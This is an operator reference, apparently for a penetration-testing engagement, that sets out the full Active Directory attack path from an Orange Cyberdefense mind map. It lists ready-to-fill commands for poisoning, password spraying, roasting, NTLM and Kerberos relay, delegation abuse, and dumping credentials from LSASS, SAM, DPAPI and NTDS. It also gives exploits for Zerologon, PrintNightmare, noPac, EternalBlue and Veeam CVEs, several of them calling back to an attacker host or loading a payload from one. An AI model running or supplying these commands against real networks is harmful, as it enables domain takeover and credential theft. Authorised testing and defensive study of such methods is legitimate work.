# OCD Active Directory Mind Map — Operator Reference (v2025.03)

> Technique, methodology, tooling, and target-capability basis for PLAN-003.
> Parsed from the Orange Cyberdefense public AD mind map. This document carries the
> full command set; `data/ocd-ad-mindmap-2025.03.taxonomy.json` is the machine-readable
> sidecar. Placeholders in `<angle brackets>` are filled at engagement time.

## Provenance
- Source: `Orange-Cyberdefense/ocd-mindmaps` @ `6d16ca0d1434875e0617f2f3cfa825fad0bc7d7e`; rendered SVG sha256 `2816aa470c27773aee6aa69d7b71ebb90865aef27faa65a71764fdde445f5dbf`
- Parsed from `excalimap/mindmap/ad/*.md` (17 phase files + `conf.yml`) by `parse_mindmap.py` (deterministic).
- Scale: 17 categories · 128 subjects · 450 commands · 159 tools.

## Engagement progression (matrix columns)

- **Col 1:** No Credentials → Quick Compromise
- **Col 2:** Valid user (no password) → Man In The Middle (Listen and Relay) → Crack hash
- **Col 3:** Valid Credentials (cleartext creds, nt hash, kerberos ticket)
- **Col 4:** Low access (Privilege escalation) → Know vulnerabilities authenticated → ACLs/ACEs permissions
- **Col 5:** Kerberos Delegation → ADCS → SCCM
- **Col 6:** Admin access → Lateral Move
- **Col 7:** Domain admin → Trusts → Persistence


## No Credentials  (`no_creds`)

_Tools:_ Pcredz, bettercap, dig, enum4linux-ng.py, kerbrute, ldapsearch, mitm6, nmap, nmcli, nslookup, nxc, petitpotam.py, pxethief.py, responder, smbclient, tftp, timeroast.py

### Scan network
_flow:_ Vulnerable host
- `nxc smb <ip_range>`
- `nmap -sP -p <ip>`
- `nmap -Pn -sV --top-ports 50 --open <ip>`
- `nmap -Pn --script smb-vuln* -p139,445 <ip>`
- `nmap -Pn -sC -sV -oA <output> <ip>`
- `nmap -Pn -sC -sV -p- -oA <output> <ip>`
- `nmap -sU -sC -sV -oA <output> <ip>`

### Find DC IP
- `nmcli dev show <interface>`
- `nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>`
- `nmap -p 88 --open <ip_range>`

### Zone transfer
- `dig axfr <domain_name> @<name_server>`

### Anonymous & Guest access on SMB shares
- `nxc smb <ip_range> -u '' -p ''`
- `nxc smb <ip_range> -u 'a' -p ''`
- `enum4linux-ng.py -a -u '' -p '' <ip>`
- `smbclient -U '%' -L //<ip>`

### Enumerate LDAP
_flow:_ Username
- `nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>`
- `ldapsearch -x -H <dc_ip> -s base`

### Enumerate Users
_flow:_ Username
- `nxc smb <dc_ip> --users`
- `nxc smb <dc_ip> --rid-brute 10000 # bruteforcing RID`
- `net rpc group members 'Domain Users' -W '<domain> -l <ip> -U '%'`

### Bruteforce users
_flow:_ Username
- `kerbrute userenum -d <domain> <userlist>`
- `nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm= '<domain>',userdb=<user_list_file>" <dc_ip>`

### Poisoning
_flow:_ poisoning SMB || poisoning LDAP || poisoning HTTP
- LLMNR / NBTNS / MDNS
  - `responder -l <interface>`
- ⚠️ DHCPv6 (IPv6 prefered to IPv4)
  - `mitm6 -d <domain>`
  - `bettercap`
- ⚠️ ARP Poisoning
  - `bettercap`
  - `asreqroast`
    - `Pcredz -i <interface> -v``  → _Hash found ASREQ_

### Coerce
_flow:_ Coerce SMB
- Unauthenticated PetitPotam (CVE-2022-26925) `@CVE@`
  - `petitpotam.py -d <domain> <listener> <target>`

### PXE
- no password  → _Credentials (NAA account)_
  - `pxethief.py 1`
  - `pxethief.py 2 <distribution_point_ip>`
- password protected  → _PXE Hash_
  - `tftp -i <dp_ip> GET "\xxx\boot.var"`
  - `pxethief.py 5 '\xxx\boot.var'`

### TimeRoasting
_flow:_ timeroast hash
- `timeroast.py <dc_ip> -o <output_log>`

## Valid user (no password)  (`valid_user`)

_Tools:_ CVE-2022-33679.py, Get-ADDefaultDomainPasswordPolicy, Get-ADFineGainedPasswordPolicy, GetNPUsers.py, GetUserSPNs.py, MATCH, Rubeus.exe, hashcat, kerbrute, ldapsearch-ad.py, ldeep, nxc, sprayhound

### Password Spray
- Get password policy  (you need creds,but you should get the policy  first to avoid locking accounts)
  - default policy
    - `nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol`
      [https://www.thehacker.recipes/ad/recon/password-policy](https://www.thehacker.recipes/ad/recon/password-policy)
    - `Get-ADDefaultDomainPasswordPolicy`
    - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy`
  - Fined Policy (Privileged)
    - `ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols`
    - `Get-ADFineGainedPasswordPolicy -filter *`
    - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso # can also be runned with a low priv account but less information will be available`
- ⚠️ user == password  → _Clear text Credentials_
  - `nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success`
  - `sprayhound -U <users.txt> -d <domain> -dc  <dc_ip>   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass`
- ⚠️ usuals passwords  (SeasonYear!, Company123, ...)  → _Clear text Credentials_
  - `nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success`
  - `sprayhound -U <users.txt> -p <password> -d <domain> -dc  <dc_ip>`
  - `kerbrute passwordspray -d <domain> <users.txt> <password>`

### ASREPRoast
- List ASREPRoastable Users (need creds)
  - `MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u`
- ASREP roasting  → _Hash found ASREP_
  - `GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>`
  - `nxc ldap <dc_ip> -u <users.txt>  -p '' --asreproast <output.txt>`
  - `Rubeus.exe asreproast /format:hashcat`
- Blind Kerberoasting  → _Hash found TGS_
  - `Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>`
  - `GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host "<dc_ip>" "<domain>"/`
- CVE-2022-33679 `@CVE@`  → _Lat move PTT_
  - `CVE-2022-33679.py <domain>/<user> <target>`

## Valid Credentials (cleartext creds, nt hash, kerberos ticket)  (`authenticated`)

_Tools:_ AD-miner, GetADUsers.py, GetUserSPNs.py, Import-Module, MATCH, PingCastle.exe, Rubeus.exe, SOAPHound.exe, SharpSCCM.exe, adidnsdump, bloodhound-python, certify.exe, certipy, coercer.py, dnstool.py, ldapdomaindump.py, ldapsearch-ad.py, ldeep, manspider, ntlm_theft.py, nxc, petitpotam.py, printerbug.py, rusthound, rusthound-ce, sccmhunter.py, sharphound.exe

### Classic Enumeration (users, shares, ACL, delegation, ...)
- Find all users  → _Username_
  - `GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>`
  - `nxc smb <dc_ip> -u '<user>' -p '<password>' --users`
- Enumerate SMB share  → _Scroll shares_
  - `nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus`
  - `nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\<filename> <filename>]`
  - `manspider <ip_range> -c passw -e <file extensions> -d <domain> -u <user> -p <password>`
- Bloodhound Legacy  → _ACL || Delegation || Username_
  - `bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all`
  - `rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z`
  - `import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain <domain>`
  - `sharphound.exe -c all -d <domain>`
- Bloodhound CE  → _ACL || Delegation || Username_
  - `bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all`
  - `rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter=(objectGuid=*)`
  - `sharphound.exe -c all -d <domain>`
  - `SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 900`
- Enumerate Ldap  → _ACL || Delegation || Username_
  - `ldeep ldap -u <users> -p '<password>' -d <domain> -s ldap://<dc_ip> all <backup_folder>`
  - `ldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389`
  - `ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all`
- Enumerate DNS  → _New targets (low hanging fruit)_
  - `adidnsdump -u <domain>\\<user> -p "<password>" --print-zones <dc_ip>`

### Enumerate ADCS
_flow:_ ADCS Exploitation
- `certify.exe find`
- `certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>`

### Enumerate SCCM
_flow:_ SCCM Exploitation
- `sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug`
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm`
- `SharpSCCM.exe local site-info`

### Scan Auto
- from BH result
  - `AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>`
- `PingCastle.exe --healthcheck --server <domain>`
- `Import-Module .\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'`

### Kerberoasting
_flow:_ Hash TGS
- `MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u`
- `GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>`
- `Rubeus.exe kerberoast`

### Coerce
- Drop file
  - .lnk
    - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>`
  - .scf
    - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>`
  - .url
    - `[InternetShortcut]... IconFile=\\<attacker_ip>\%USERNAME%.icon`
  - Other files
    - `ntlm_theft.py -g all -s <your_ip> -f test`
- Webdav
  - Enable webclient
    - .searchConnector-ms
      - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc`
  - add attack computer in dns
    - `dnstool.py -u <domain>\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>`
  - Launch coerce with <attacker_hostname>@80/x as target  → _HTTP Coerce_
- RPC call  → _SMB NTLM Coerce_
  - `printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>`
  - `petitpotam.py -d <domain> -u <user> -p <password> <listnerer_ip> <target_ip>`
  - `coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>`
- Coerce kerberos  → _SMB Kerberos coerce_
  - `dnstool.py -u "<domain>\<user>" -p '<password>' -d "<attacker_ip>" --action add "<dns_server_ip>" -r "<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" --tcp`
    - `petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>`

### Intra ID Connect
- Find MSOL
  - `nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users |grep -i MSOL`

### Can Connect to a computer
_flow:_ Lateral move

### Exploit
_flow:_ know vulnerabilities

## Low access (Privilege escalation)  (`low_access`)

_Tools:_ .\PrivescCheck.ps1, Get-ChildItem, KrbRelayUp.exe, MsBuild.exe, dnstool.py, findstr, installutil.exe, msdt.exe, mshta.exe, petitpotam.py, vssadmin, winPEASany_ofs.exe, wsreset.exe

### Bypass Applocker
_flow:_ Low access (without applocker)
- Get-Applocker infos
  - `Get-ChildItem -Path HKLM:\SOFTWARE\Policies \Microsoft\Windows\SrpV2\Exe (dll/msi/...)`
- files in writables paths
  - C:\Windows\Temp
  - C:\Windows\Tasks
- `installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe`
- `mshta.exe my.hta`
- `MsBuild.exe pshell.xml`

### UAC bypass
_flow:_ Admin
- `Fodhelper.exe`
- `wsreset.exe`
- `msdt.exe`

### Auto Enum
_flow:_ Admin
- `winPEASany_ofs.exe`
- `.\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended"`

### Search files
_flow:_ User Account
- `findstr /si 'pass' *.txt *.xml *.docx *.ini`

### Exploit
_flow:_ Admin
- SMBGhost CVE-2020-0796 `@CVE@`
- CVE-2021-36934 (HiveNightmare/SeriousSAM) `@CVE@`
  - `vssadmin list shadows`

### Webdav
_flow:_ HTTP Coerce
- open file <file>.searchConnector-ms
  - `dnstool.py -u <domain>\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>`
    - `petitpotam.py -u '<user>' -p <pass> -d '<domain>' "attacker@80/random.txt" <ip>`

### Kerberos Relay
_flow:_ Admin
- `KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>`
  - `KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name>-cp <omputer_pass>`

### From Service account (SEImpersonate)
_flow:_ Admin
- RoguePatato `@CVE@`
- GodPotato `@CVE@`
- PrintSpoofer `@CVE@`
- RemotePotato0

## Kerberos Delegation  (`delegation`)

_Tools:_ MATCH, Rubeus.exe, addcomputer.py, findDelegation.py, getST.py, getTGT.py, mimikatz, rbcd.py

### Find delegation
- `findDelegation.py "<domain>"/"<user>":"<password>"`
- With BloodHound
  - Unconstrained
    - `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
    - `MATCH (c:User {unconstraineddelegation:true}) RETURN c`
  - Constrained
    - `MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p`
    - `MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: "<MYTARGET.FQDN>"})) RETURN p`

### Unconstrained delegation
_flow:_ Kerberos TGT >>> PassTheTicket
- UAC: ADS_UF_TRUSTED_FOR_DELEGATION
  - Force connection  with coerce
    - Get tickets
      - `mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export`
      - `Rubeus.exe dump /service:krbtgt /nowrap`
      - `Rubeus.exe dump /luid:0xdeadbeef /nowrap`
      - `Rubeus.exe monitor /interval:5`

### Constrained delegation
- With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION
  - Get TGT for user
    - Request S4u2self
      - Request S4u2proxy
  - `Rubeus.exe hash /password:<password>`
    - `Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>`
      - `Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt`
        - Altservice HTTP/HOST/CIFS/LDAP  → _Kerberos TGS_
  - `getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>`
    - Altservice HTTP/HOST/CIFS/LDAP  → _Kerberos TGS_
- Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION
  - Constrain between Y and Z
    - Add computer X
      - Add RBCD : delegate from X to Y
        - s4u2self X (impersonate admin)
          - S4u2Proxy X (impersonate admin on spn/Y)
            - Forwardable TGS for Y
              - S4u2Proxy Y (impersonate admin on spn/Z)
  - add computer account
    - `addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'`
  - RBCD With added computer account  → _Kerberos TGS_
    - `rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained>$`
      - `getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'`
        - `getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>`
  - Self RBCD `@CVE@`
    - Like RBCD without add computer

### Resource-Based Constrained Delegation
- add computer account
  - `addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'`
- RBCD With added computer account
  - `Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>`
    - `Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt``  → _Admin_
  - `rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>`
    - `getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>``  → _Kerberos TGT >>> Admin_

### S4U2self abuse
- Get machine account (X)'s TGT
  - Get a ST on X as user admin
- `getTGT.py -dc-ip "<dc_ip>" -hashes :"<machine_hash>" "<domain>"/"<machine>$"`
  - `getST.py -self -impersonate "<admin>" -altservice "cifs/<machine>" -k -no-pass -dc-ip "DomainController" "<domain>"/'<machine>$'``  → _Admin_

## Admin access  (`admin`)

_Tools:_ DPAPImk2john.py, PPLdump64.exe, SharpDPAPI.exe, azuread_decrypt_msol_v2.ps1, donpapi, dpapidump.py, dploot.py, irs.exe, lsassy, masky, mimikatz, msf>, nxc, procdump.exe, psexec.exe, query, reg, reg.py, regsecrets.py, secretsdump.py, smbmap.py, tscon.exe

### Extract credentials from LSASS.exe
- LSASS as protected process
  - `PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp #before 2022-07-22 update`
  - `mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate"  "sekurlsa::logonpasswords" "!processprotect  /process:lsass.exe" "!-"`
- Extract LSASS secrets  → _User + Pass || NTLM || PassTheHash || Clear text move_
  - `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
  - `mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"  "exit"`
  - `msf> load kiwi creds_all`
  - `nxc smb <ip_range> -u <user> -p <password> -M lsassy`
  - `lsassy -d <domain> -u <user> -p <password> <ip>`

### Extract credentials from SAM
_flow:_ NTLM || PassTheHash
- `nxc smb <ip_range> -u <user> -p <password> --sam`
- `msf> hashdump`
- `mimikatz "privilege::debug" "lsadump::sam" "exit"`
- `secretsdump.py <domain>/<user>:<password>@<ip>`
- `reg save HKLM\SAM <file>;  reg save HKLM\SYSTEM <file>`
  - `secretsdump.py -system SYSTEM -sam SAM LOCAL`
- `reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'`
  - `secretsdump.py -system SYSTEM -sam SAM LOCAL`
- `regsecrets.py <domain>/<user>:<password>@<ip>`

### Extract credentials from LSA
_flow:_ MsCache 2 || User + Pass
- `nxc smb <ip_range> -u <user> -p <password> --lsa`
- `mimikatz "privilege::debug" "lsadump::lsa" "exit"`
- `reg save HKLM\SECURITY <file>;  reg save HKLM\SYSTEM <file>`
  - `secretsdump.py -system SYSTEM -security SECURITY`
- `reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'`

### Extract credentials from DPAPI
- DPAPI  → _User + Pass || PassTheHash || Clear text move_
  - `nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]`
  - `donpapi <domain>/<user>:<password>@<target>`
  - `dpapidump.py <domain>/<user>:<password>@<target>`
  - get masterkey
    - `mimikatz "sekurlsa::dpapi"`
      - `dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>`
    - `lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys`
      - `dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>`
  - `SharpDPAPI.exe triage`
- Crack users masterkey  → _DPAPImk_
  - copy c:\users\<user>\AppData\Roaming\Microsoft\Protect\<SID>
    - `DPAPImk2john.py --preferred <prefered_file>`
      - `DPAPImk2john.py -c domain -mk <masterkey> -S <sid>`

### Impersonate
- Impersonate  → _ACL || User + Pass_
  - `msf> use incognito impersonate_token <domain>\\<user>`
  - `nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users`
    - `nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>`
  - `irs.exe list`
    - `irs.exe exec -p <pid> -c <command>`
- Impersonate with adcs  → _NTLM || Pass The Hash / Ticket / Certificate_
  - `masky - d <domain> -u <user>  (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>`
- Impersonate RDP Session  → _RDP_
  - `psexec.exe -s -i cmd`
    - `query user`
      - `tscon.exe <id> /dest:<session_name>`

### Misc
- Find Users  → _Username_
  - `smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv`
- Extract Keepass  → _User + Pass_
  - `KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll`
  - `KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>`
- Hybrid (Azure AD-Connect)  → _DCSYNC_
  - Dump cleartext password of MSOL Account on ADConnect Server
    - `azuread_decrypt_msol_v2.ps1`
    - `nxc smb <ip> -u <user> -p <password> -M msol`

## Domain admin  (`dom_admin`)

_Tools:_ certsync, donpapi, mimikatz, msf>, nxc, secretsdump.py

### Dump ntds.dit
_flow:_ Lateral move || Crack hash
- `nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds`
- `secretsdump.py '<domain>/<user>:<pass>'@<ip>`
- `ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`
  - `secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract`
- `msf> windows/gather/credentials/domain_hashdump`
- `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator`
- `certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>`

### Grab backup Keys
_flow:_ Credentials
- `donpapi collect - H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk`

## Quick Compromise  (`low_hanging`)

_Tools:_ CVE-2023-27532, CVE-2024-29849.py, CVE-2024-29855.py, CVE-2024-40711.exe, VeeamHax.exe, cve-2020-1472-exploit.py, cve_2023_41320.py, msf>, nuclei, proxyshell_rce.py, ysoserial.jar, zerologon-scan

### ⚠️ Zerologon (unsafe) CVE-2020-1472 @CVE@
_flow:_ Domain admin
- `zerologon-scan '<dc_netbios_name>' '<ip>'`
- `cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>`

### Eternal Blue MS17-010 @CVE@
_flow:_ Admin || Low access
- `msf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only`

### Tomcat/Jboss Manager
_flow:_ Admin || Low access
- `msf> auxiliary/scanner/http/tomcat_enum`
- `msf> exploit/multi/http/tomcat_mgr_deploy`

### Java RMI
_flow:_ Admin || Low access
- `msf> use exploit/multi/misc/java_rmi_server`

### Java Serialiszed port
_flow:_ Admin || Low access
- `ysoserial.jar <gadget> '<cmd>' |nc <ip> <port>`

### Log4shell
_flow:_ Admin || Low access
- ${jndi:ldap://<ip>:<port>/o=reference}

### Database
_flow:_ Admin || Low access
- `msf> use auxiliary/admin/mssql/mssql_enum_sql_logins`

### Exchange
_flow:_ Admin
- Proxyshell `@CVE@`
  - `proxyshell_rce.py -u https://<exchange> -e administrator@<domain>`

### Veeam
_flow:_ User Account || Low access || Admin
- CVE-2023-27532 (creds - Veeam backup) `@CVE@`
  - `VeeamHax.exe --target <veeam_server>`
  - `CVE-2023-27532 net.tcp:/<target>:<port>/`
- CVE-2024-29849 (auth bypass - Veeam Backup Enterprise Manager) `@CVE@`
  - `CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/ --callback-server <attacker_ip>:<port>`
- CVE-2024-29855 (auth bypass - Veeam Recovery Orchestrator) `@CVE@`
  - `CVE-2024-29855.py  --start_time <start_time_epoch> --end_time <end_time_epoch> --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/`
- CVE-2024-40711 (unserialize - Veeam backup) `@CVE@`
  - `CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>`

### GLPI
_flow:_ Admin || Low access
- CVE-2022-35914 `@CVE@`
  - /vendor/htmlawed/htmlawed/htmLawedTest.php
- CVE_2023_41320 `@CVE@`
  - `cve_2023_41320.py -u <user> -p <password> -t <ip>`

### Weak websites / services
- nuclei
  - `nuclei -target <ip_range>`
- nessus

## Man In The Middle (Listen and Relay)  (`mitm`)

_Tools:_ krbrelayx.py, msf>, ntlmrelayx.py, nxc, responder, smbclient.py

### Listen
_flow:_ Hash NTLMv1 or NTLMv2 || Username || Credentials (ldap/http)
- `responder -l <interface> #use --lm to force downgrade`
- `smbclient.py`

### NTLM relay
- MS08-068 self relay `@CVE@`
  - `msf> exploit/windows/smb_smb_relay # windows 2000 / windows server 2008`
- SMB -> LDAP(S)
  - NTLMv1
    - remove mic (no CVE needed)  → _see LDAP(S)_
  - NTLMv2
    - Remove mic (CVE-2019-1040) `@CVE@`  → _see LDAP(S)_
- HTTP(S) -> LDAP(S)
  - Usually from webdav coerce  → _see LDAP(S)_
- To LDAP(S)
  - Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)
    - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access ``  → _RBCD_
    - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'``  → _Shadow Credentials_
    - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>``  → _Domain admin_
    - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111``  → _LDAP SHELL_
- To SMB
  - Relay to SMB (if SMB is not signed)
    - Find SMB not signed targets (default if not a Domain controler)
      - `nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt`
    - `ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks``  → _SMB Socks_
- To HTTP
  - Relay to CA web enrollement  → _ESC8_
  - Relay to WSUS  → _WSUS_
- To MsSQL
  - `ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks``  → _MSSQL Socks_
- SMB -> NETLOGON
  - Zero-Logon (safe method) (CVE-202-1472) `@CVE@`
    - Relay one dc to another
      - `ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>``  → _DCSYNC_

### Kerberos relay
- To HTTP
  - `krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>``  → _ESC8_
- SMB -> SMB
  - same as NTLM relay, use krbrelayx.py
- SMB -> LDAP(S)
  - same as NTLM relay, use krbrelayx.py

## Know vulnerabilities authenticated  (`know_vuln_auth`)

_Tools:_ Get-GPPPassword.py, certipy, findSMB2UPTime.py, findstr, goldenPac.py, ms14-068.py, msf>, noPac.exe, nxc, poc_aug3.py, printnightmare.py, privexchange.py

### MS14-068
_flow:_ PTT >>> Domain admin || Admin
- `findSMB2UPTime.py <ip>`
  - `ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>`
  - `msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum`
  - `goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target`

### GPP MS14-025
_flow:_ Domain admin
- `msf> use auxiliary/scanner/smb/smb_enum_gpp`
- `findstr /S /I cpassword \\<domain_fqdn>\sysvol\<domain_fqdn>\policies\*.xml`
- `Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>`

### PrivExchange (CVE-2019-0724, CVE-2019-0686)
_flow:_ HTTP Coerce >>> Domain admin || Admin
- `privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>`

### noPac (CVE-2021-42287, CVE-2021-42278)
_flow:_ PTT >>> DCSYNC >>> Domain admin
- `nxc smb <ip> -u 'user' -p 'pass' -M nopac #scan`
- `noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt`

### PrintNightmare (CVE-2021-1675, CVE-2021-34527)
_flow:_ Admin
- `nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scan`
- `printnightmare.py -dll '\\<attacker_ip>\smb\add_user.dll' '<user>:<password>@<ip>'`

### Certifried (CVE-2022-26923)
_flow:_ PTT >>> DCSYNC >>> Domain admin
- Create account
  - `certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'`
- Request
  - `certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine`
- Authentication
  - `certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>`

### ProxyNotShell (CVE-2022-41040, CVE-2022-41082)
_flow:_ Admin
- `poc_aug3.py <host> <username> <password> <command>`

## ADCS  (`adcs`)

_Tools:_ Rubeus.exe, certify.exe, certipy, certutil, gettgtpkinit.py, ldeep, ntlmrelayx.py

### Enumeration
_flow:_ Web enrollement || Vulnerable template || Vulnerable CA || Misconfigured ACL || Vulnerable PKI Object AC
- `certutil -v -dsTemplate`
- `certify.exe find [ /vulnerable]`
- `certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>`
- `ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates`
- Get PKI objects information
  - `certify.exe pkiobjects`
- Display CA information
  - `certutil -TCAInfo`
  - `certify.exe cas`

### Web Enrollment Is Up
_flow:_ Domain admin
